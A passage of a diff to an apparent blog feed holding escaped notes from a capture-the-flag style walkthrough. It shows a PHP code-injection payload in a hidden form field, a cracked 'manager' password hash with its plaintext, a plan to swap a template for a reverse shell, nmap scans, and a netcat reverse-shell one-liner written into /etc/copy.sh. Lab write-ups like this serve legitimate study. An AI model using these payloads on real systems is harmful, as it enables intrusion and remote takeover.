+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;adk&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hacked&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;textarea&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;adv&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;echo &amp;#39;&amp;lt;h1&amp;gt; Hacked &amp;lt;/h1&amp;gt;&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;phpinfo();?&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ni&#34;&gt;&amp;amp;lt;&lt;/span&gt;/textarea&lt;span class=&#34;ni&#34;&gt;&amp;amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;name: manager
+-password: 42f749ade7f9e195bf475f37a44cafcb - hashid: md5 - password is= Password123&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;change main.php template to reverse shell&lt;/p&gt;
+&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
@@ -1216,7 +1286,7 @@ phpinfo();?&gt;
 &lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
 &lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;echo &amp;ldquo;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.18.53.113 4445 &amp;gt;/tmp/f&amp;rdquo; &amp;gt; /etc/copy.sh&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;echo &amp;quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.18.53.113 4445 &amp;gt;/tmp/f&amp;quot; &amp;gt; /etc/copy.sh&lt;/code&gt;&lt;/p&gt;
 </description>
     </item>
     
